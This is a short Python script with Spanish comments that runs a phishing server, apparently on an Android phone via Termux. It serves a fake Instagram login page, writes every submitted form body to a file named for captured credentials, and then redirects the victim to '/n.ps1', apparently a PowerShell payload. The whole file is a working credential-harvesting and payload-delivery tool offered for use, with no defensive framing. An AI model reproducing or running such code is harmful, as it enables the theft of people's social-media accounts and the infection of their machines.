import http.server
import socketserver
import os
import subprocess

# Forzamos que no se detenga por errores de socket
socketserver.TCPServer.allow_reuse_address = True
PORT = 9090

class PersistentNexus(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Servimos el login de Instagram que creamos
        if self.path == '/' or self.path == '/login':
            self.path = '/sdcard/Download/social_login.html'
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            data = self.rfile.read(content_length).decode('utf-8')
            with open("/sdcard/Download/creds_capturadas.txt", "a") as f:
                f.write(f"CAPTURA: {data}\n")
            print("[+] Datos recibidos. Nexus sigue operando...")
            
            # Vibración de éxito en el Motorola
            os.system("termux-vibrate -d 1000")
            
            # Redirección ciega al payload
            self.send_response(301)
            self.send_header('Location', '/n.ps1')
            self.end_headers()
        except Exception as e:
            print(f"Error ignorado: {e}")
            self.send_response(200)
            self.end_headers()

print(f"[*] NEXUS CORE: Vigilancia activa en puerto {PORT}")
try:
    with socketserver.TCPServer(("", PORT), PersistentNexus) as httpd:
        httpd.serve_forever()
except KeyboardInterrupt:
    print("\n[-] Apagado controlado.")
